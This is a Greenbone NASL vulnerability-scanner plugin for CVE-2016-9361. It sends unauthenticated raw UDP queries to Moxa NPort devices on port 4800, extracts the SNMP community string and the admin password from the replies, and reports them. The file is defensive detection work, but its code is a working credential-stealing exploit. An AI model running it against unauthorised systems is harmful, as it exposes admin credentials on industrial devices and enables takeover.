# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106694");
  script_version("2023-07-14T16:09:27+0000");
  script_tag(name:"last_modification", value:"2023-07-14 16:09:27 +0000 (Fri, 14 Jul 2023)");
  script_tag(name:"creation_date", value:"2017-03-24 13:37:18 +0700 (Fri, 24 Mar 2017)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2017-02-17 18:08:00 +0000 (Fri, 17 Feb 2017)");

  script_cve_id("CVE-2016-9361");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Moxa NPort Information Disclosure Vulnerability");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_family("General");
  script_dependencies("gb_moxa_protocol_detect.nasl");
  script_mandatory_keys("moxa_mgmt_proto/detected", "moxa_mgmt_proto/req_data");

  script_tag(name:"summary", value:"Moxa NPort devices are prone to an information disclosure vulnerability.");

  script_tag(name:"vuldetect", value:"Tries to obtain the SNMP community string and the admin password.");

  script_tag(name:"insight", value:"Administration passwords can be retried without authenticating over the
proprietary management protocol over port 4800/udp.");

  script_tag(name:"solution", value:"Moxa has released new firmware versions which addresses the identified
vulnerabilities.");

  script_xref(name:"URL", value:"https://ics-cert.us-cert.gov/advisories/ICSA-16-336-02");
  script_xref(name:"URL", value:"https://github.com/reidmefirst/MoxaPass");

  exit(0);
}

include("byte_func.inc");
include("misc_func.inc");
include("moxa.inc");

query_data = get_kb_item("moxa_mgmt_proto/req_data");
if (!query_data)
  exit(0);

port = 4800;

if (!get_udp_port_state(port))
  exit(0);

soc = open_sock_udp(port);
if (!soc)
  exit(0);

# Read the SNMP read community
snmp_query = raw_string(0x28, 0x00, 0x00, 0x14, query_data);
snmp_recv = moxa_send_recv(socket: soc, data: snmp_query);

if (strlen(snmp_recv) > 32) {
  buf = substr(snmp_recv, 24);
  i = 0;
  while (hexstr(buf[i]) != "00") {
    snmp_community += buf[i];
    i++;
  }
}

pw_query = raw_string(0x29, 0x00, 0x00, 0x14, query_data);
pw_recv = moxa_send_recv(socket: soc, data: pw_query);

if (strlen(pw_recv) > 200) {
  buf = substr(pw_recv, 200);
  i = 0;
  while (hexstr(buf[i]) != "00") {
    admin_pw += buf[i];
    i++;
  }
}

close(soc);

if (snmp_community || admin_pw) {
  report = "The following information could be obtained:\n\n";

  if (admin_pw)
    report += "Admin Password:         " + admin_pw + "\n";

  if (snmp_community)
    report += "SNMP Read Community:    " + snmp_community + "\n";

  security_message(port: port, data: report);
  exit(0);
}

exit(0);
